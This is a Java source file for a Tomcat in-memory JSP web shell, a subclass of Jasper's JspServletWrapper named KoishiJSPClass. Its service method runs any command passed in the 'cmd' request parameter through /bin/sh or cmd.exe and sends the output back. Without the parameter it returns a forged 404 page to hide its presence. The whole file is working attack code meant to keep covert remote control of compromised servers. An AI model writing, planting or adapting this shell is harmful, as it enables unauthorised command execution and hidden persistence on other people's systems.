package com.tomcat.memshell.JSPMemShell;

import org.apache.jasper.Options;
import org.apache.jasper.compiler.JspRuntimeContext;
import org.apache.jasper.compiler.Localizer;
import org.apache.jasper.servlet.JspServletWrapper;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

class KoishiJSPClass extends JspServletWrapper {

    public KoishiJSPClass(ServletConfig config, Options options, JspRuntimeContext rctxt) {
        super(config, options, "", rctxt); // jspUri随便取值
    }

    @Override
    public void service(HttpServletRequest request, HttpServletResponse response, boolean precompile) throws ServletException, IOException, FileNotFoundException, IOException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")){
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = response.getWriter();
            out.println(output);
            out.flush();
            out.close();
        } else {
            // 伪造404页面
            String msg = Localizer.getMessage("jsp.error.file.not.found", new Object[]{"/koishi.jsp"});
            response.sendError(404, msg);
        }
    }
}
